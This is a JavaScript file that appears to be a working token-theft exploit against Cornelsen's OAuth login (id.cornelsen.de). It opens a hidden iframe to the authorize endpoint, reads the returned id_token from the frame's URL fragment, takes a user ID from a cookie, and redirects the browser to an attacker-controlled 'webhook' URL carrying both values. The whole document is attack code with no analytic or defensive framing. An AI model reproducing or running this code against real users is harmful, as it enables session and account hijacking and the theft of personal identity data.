var xhr = new XMLHttpRequest();
var xe = document.createElement('iframe');
xe.setAttribute('src', 'https://id.cornelsen.de/oxauth/restv1/authorize?client_id=%40!38C4.659F.8000.3A79!0001!7F12.03E3!0008!026F.2F97.1A84.8F3E&redirect_uri=https%3A%2F%2Fkekstest.cornelsen.de%2Fkekstest%2FSeiten%2Fdefault.aspx&response_mode=get&response_type=code%20id_token&scope=cv_schule%20cv_sap_kdnr%20email%20inum%20openid%20profile%20user_name%20roles&state=aaaaa&nonce=ssss.aaaaa');
xe.setAttribute('id', 'ddd');

// Function to add the iframe and send the request
function sendRequest() {
    document.body.appendChild(xe);
}

// Sleep function
function sleep(time) {
    return new Promise((resolve) => setTimeout(resolve, time));
}

// Function to extract the token and userId
function extractData() {
    let token = new URLSearchParams(document.getElementById("ddd").contentWindow.location.hash.split('#')[1]).get('id_token');
    let userId = document.cookie.split('; ').find(row => row.startsWith('UserStat')).split('=')[1].split('%')[0];
    return { token, userId };
}

// Retry logic: if id_token or userId is empty, retry the request
async function retryIfEmpty(maxRetries, delay) {
    for (let attempt = 1; attempt <= maxRetries; attempt++) {
        // Wait before checking
        await sleep(delay);

        // Extract token and userId
        let { token, userId } = extractData();

        // If token and userId are present, proceed
        if (token && userId) {
            console.log('Token and userId found:', token, userId);
            let webhook = new URLSearchParams(window.location.search).get('webhook');
            window.location.href = webhook.startsWith('https://') ? `${webhook}?userId=${userId}&token=${token}` : `https://${webhook}/?userId=${userId}&token=${token}`;
            return;
        } else {
            console.log('Token or userId is empty, retrying...', attempt);
            // Remove the iframe before retrying to avoid multiple instances
            document.getElementById("ddd").remove();

            // Recreate the iframe for the retry
            xe = document.createElement('iframe');
            xe.setAttribute('src', 'https://id.cornelsen.de/oxauth/restv1/authorize?client_id=%40!38C4.659F.8000.3A79!0001!7F12.03E3!0008!026F.2F97.1A84.8F3E&redirect_uri=https%3A%2F%2Fkekstest.cornelsen.de%2Fkekstest%2FSeiten%2Fdefault.aspx&response_mode=get&response_type=code%20id_token&scope=cv_schule%20cv_sap_kdnr%20email%20inum%20openid%20profile%20user_name%20roles&state=aaaaa&nonce=ssss.aaaaa');
            xe.setAttribute('id', 'ddd');
            sendRequest();  // Append iframe again for the retry
        }
    }

    console.log('Max retries reached. Could not obtain token or userId.');
}

// Start by sending the initial request and then retry if necessary
sendRequest();
retryIfEmpty(3, 5000);  // Max 3 retries with a 5-second delay between attempts
